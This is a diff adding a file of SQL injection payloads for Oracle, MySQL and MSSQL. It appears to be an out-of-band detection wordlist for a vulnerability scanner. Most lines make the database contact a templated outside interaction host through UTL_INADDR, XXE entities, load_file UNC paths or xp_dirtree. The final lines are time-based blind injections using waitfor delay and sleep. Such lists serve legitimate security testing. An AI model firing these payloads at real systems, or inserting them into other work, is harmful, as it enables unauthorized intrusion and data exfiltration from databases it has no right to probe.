@@ -1,0 +1,46 @@
+||UTL_INADDR.get_host_address('{{interactsh-url}}')
+'||UTL_INADDR.get_host_address('{{interactsh-url}}')||'
+||extractvalue(xmltype('<!DOCTYPE root [<!ENTITY % xxx SYSTEM "http://{{interactsh-url}}/ext1">%xxx;]>'),'/l')
+'||extractvalue(xmltype('<!DOCTYPE root [<!ENTITY % xxx SYSTEM "http://{{interactsh-url}}/ext2">%xxx;]>'),'/l')||'
+UTL_INADDR.get_host_address(ORACLE_ENCODE_STRING({{interactsh-url}}))
+ or chr(1)=UTL_INADDR.get_host_address(ORACLE_ENCODE_STRING({{interactsh-url}}))
+extractvalue(xmltype(ORACLE_ENCODE_STRING(<!DOCTYPE root [<!ENTITY % xxx SYSTEM "http://{{interactsh-url}}/ext3">%xxx;]>),ORACLE_ENCODE_STRING(/l))
+ or chr(1)=extractvalue(xmltype(ORACLE_ENCODE_STRING(<!DOCTYPE root [<!ENTITY % xxx SYSTEM "http://{{interactsh-url}}/ext4">%xxx;]>),ORACLE_ENCODE_STRING(/l))
+
+
+(select load_file('\\\\{{interactsh-url}}\\c'))
+'+(select load_file('\\\\{{interactsh-url}}\\e'))+'
+
+
+;EXEC master..xp_dirtree '\\{{interactsh-url}}\s'-- 
+1;EXEC master..xp_dirtree '\\{{interactsh-url}}\s'-- 
+';EXEC master..xp_dirtree '\\{{interactsh-url}}\s'-- 
+'EXEC master..xp_dirtree '\\{{interactsh-url}}\s'-- 
+');EXEC master..xp_dirtree '\\{{interactsh-url}}\s'-- 
+;EXEC master..xp_dirtree "\\{{interactsh-url}}\s"-- 
+1;EXEC master..xp_dirtree "\\{{interactsh-url}}\s"-- 
+";EXEC master..xp_dirtree "\\{{interactsh-url}}\s"-- 
+");EXEC master..xp_dirtree "\\{{interactsh-url}}\s"-- 
+"='';EXEC master..xp_dirtree "\\{{interactsh-url}}\s"-- 
+"='');EXEC master..xp_dirtree "\\{{interactsh-url}}\s"-- 
+
+
+;DECLARE @x AS VARCHAR(255);select @x=MSSQL_ENCODE_STRING(master..xp_dirtree '\\{{interactsh-url}}\s');EXEC(@x)--
+1;DECLARE @x AS VARCHAR(255);select @x=MSSQL_ENCODE_STRING(master..xp_dirtree '\\{{interactsh-url}}\s');EXEC(@x)--
+';DECLARE @x AS VARCHAR(255);select @x=MSSQL_ENCODE_STRING(master..xp_dirtree '\\{{interactsh-url}}\s');EXEC(@x)--
+');DECLARE @x AS VARCHAR(255);select @x=MSSQL_ENCODE_STRING(master..xp_dirtree '\\{{interactsh-url}}\s');EXEC(@x)--
+";DECLARE @x AS VARCHAR(255);select @x=MSSQL_ENCODE_STRING(master..xp_dirtree '\\{{interactsh-url}}\s');EXEC(@x)--
+");DECLARE @x AS VARCHAR(255);select @x=MSSQL_ENCODE_STRING(master..xp_dirtree '\\{{interactsh-url}}\s');EXEC(@x)--
+"='';DECLARE @x AS VARCHAR(255);select @x=MSSQL_ENCODE_STRING(master..xp_dirtree '\\{{interactsh-url}}\s');EXEC(@x)--
+"='');DECLARE @x AS VARCHAR(255);select @x=MSSQL_ENCODE_STRING(master..xp_dirtree '\\{{interactsh-url}}\s');EXEC(@x)--
+\';DECLARE @x AS VARCHAR(255);select @x=MSSQL_ENCODE_STRING(master..xp_dirtree '\\{{interactsh-url}}\s');EXEC(@x)--
+\";DECLARE @x AS VARCHAR(255);select @x=MSSQL_ENCODE_STRING(master..xp_dirtree '\\{{interactsh-url}}\s');EXEC(@x)--
+
+
+' waitfor delay '0:0:20'--
+ waitfor delay '0:0:20'--
+',0)waitfor delay'0:0:20'--
+'(select*from(select(sleep(20)))a)'
+' (select*from(select(sleep(20)))a) '
+' and (select*from(select(sleep(20)))a)-- 
+,(select*from(select(sleep(20)))a)
